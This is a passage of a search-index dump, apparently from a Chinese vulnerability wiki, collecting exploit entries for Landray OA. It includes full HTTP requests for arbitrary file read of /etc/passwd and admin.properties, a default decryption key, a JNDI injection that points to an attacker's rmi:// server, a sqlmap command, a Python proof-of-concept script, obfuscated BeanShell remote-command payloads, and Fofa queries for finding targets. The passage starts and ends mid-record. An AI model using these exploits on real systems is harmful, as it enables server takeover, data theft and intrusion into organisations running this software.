","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Ceis-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"蓝凌OA admin.do JNDI远程命令执行 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 蓝凌OA ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"网络测绘 app=\"Landray-OA系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 利用 蓝凌OA custom.jsp 任意文件读取漏洞 读取配置文件 /WEB-INF/KmssConfig/admin.properties 发送请求包 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 60 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} 获取password后，使用 DES方法 解密，默认密钥为 kmssAdminKey 访问后台地址使用解密的密码登录 http://xxx.xxx.xxx.xxx/admin.do 使用工具执行命令 https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] 运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7) POST /admin.do HTTP/1.1 Host: Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967 Content-Length: 70 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 method=testDbConn\u0026datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-admin.do-jndi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"蓝凌OA custom.jsp 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝凌OA ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Landray-OA系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 custom.jsp \u003c%@page import=\"com.landray.kmss.util.ResourceUtil\"%\u003e \u003c%@page import=\"net.sf.json.JSONArray\"%\u003e \u003c%@page import=\"net.sf.json.JSONObject\"%\u003e \u003c%@ page language=\"java\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\"%\u003e \u003c% JSONObject vara = JSONObject.fromObject(request.getParameter(\"var\")); JSONObject body = JSONObject.fromObject(vara.get(\"body\")); %\u003e \u003cc:import url='\u003c%=body.getString(\"file\") %\u003e'\u003e \u003cc:param name=\"var\" value=\"${ param['var'] }\"\u003e\u003c/c:param\u003e \u003c/c:import\u003e 请求包为 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 42 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"file:///etc/passwd\"}} ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 蓝凌OA 任意文件读取 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/sys/ui/extend/varkind/custom.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'var={\"body\":{\"file\":\"file:///etc/passwd\"}}' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-custom.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"蓝凌OA kmImeetingRes.do 后台SQL注入漏洞 CNVD-2021-01363 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"漏洞影响 蓝凌OA ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"网络测绘 app=\"Landray-OA系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"漏洞复现 存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程 https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json\u0026method=listUse\u0026orderby=1\u0026ordertype=down\u0026s_ajax=true 其中存在SQL注入的参数为 ordeby ， 数据包如下 GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json\u0026method=listUse\u0026orderby=1\u0026ordertype=down\u0026s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 保存为文件，使用 Sqlmap 跑一下注入 sqlmap -r sql.txt -p orderby --dbs ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"感谢名单 感谢 @Miaòa 师傅的投稿 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/:5:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-kmimeetingres.do-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-01363/"},{"categories":null,"content":"蓝凌OA sysSearchMain.do 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 蓝凌OA sysSearchMain.do文件 存在任意文件写入漏洞，攻击者获取后台权限后可通过漏洞写入任意文件，也可以通过 custom.jsp 文件未授权写入恶意文件 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝凌OA ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Landray-OA系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品官网 漏洞在 /sys/search/sys_search_main/sysSearchMain.do method 为 editrParam。 参数为 FdParameters，在 com.landray.kmss.sys.search.jar 中的 com.landray.kmss.sys.search.actions.SysSearchMainAction 类。 method 为 editrParam。 对 fdParemNames 的内容进行了判空。如果不为空,进入 SysSearchDictUtil.getParamConditionEntry 方法。 也是对 fdParemNames 进行了一次判空。然后传入 ObjectXML.objectXMLDecoderByString 方法。 /sys/search/sys_search_main/sysSearchMain.do?method=editParam\u0026fdParemNames=11\u0026FdParameters=[shellcode] 将传入进来的 string 字符进行替换。将其载入字节数组缓冲区，在传递给 objectXmlDecoder。 在 objectXmlDecoder 中。就更明显了。典型的 xmlDecoder 反序列化。 整体流程只对 FdParameters 的内容进行了一些内容替换。 导致 xmlDecoder 反序列化漏洞。 其中存在利用 custom.jsp 文件导致前台的命令执行以及文件上传，发送请求执行命令 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 17574 Cmd: dir Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}\u0026fdParemNames=11\u0026fdParameters=\u003cjava\u003e\u003cvoid class=\"bsh.Interpreter\"\u003e\u003cvoid%20method=%22eval%22\u003e\u003cstring\u003e\\u0020\\u0020\\u0020\\u0020\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u003d\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0028\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0072\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u002e\\u0046\\u0069\\u0065\\u006c\\u0064\\u0020\\u0066\\u0020\\u003d\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0020\\u003d\\u0020\\u0028\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0029\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0067\\u0072\\u006f\\u0075\\u0070\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u0069\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u0069\\u0020\\u003c\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u003b\\u0020\\u0069\\u002b\\u002b\\u0029\\u0020\\u007b\\u0020\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0020\\u0074\\u0020\\u003d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u005b\\u0069\\u005d\\u003b\\u0069\\u0066\\u0020\\u0028\\u0074\\u0020\\u003d\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0028\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0065\\u0078\\u0065\\u0063\\u0022\\u0029\\u0020\\u007c\\u007c\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0022\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-syssearchmain.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"蓝凌OA treexml.tmpl 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 蓝凌OA treexml.tmpl存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 蓝凌OA ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Landray-OA系统\" ","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证POC 1 POST /data/sys-common/treexml.tmpl Cmd: dir \u0026\u0026 ls s_bean=ruleFormulaValidate\u0026script=\\u0020\\u0020\\u0020\\u0020\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u003d\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0028\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0072\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u002e\\u0046\\u0069\\u0065\\u006c\\u0064\\u0020\\u0066\\u0020\\u003d\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065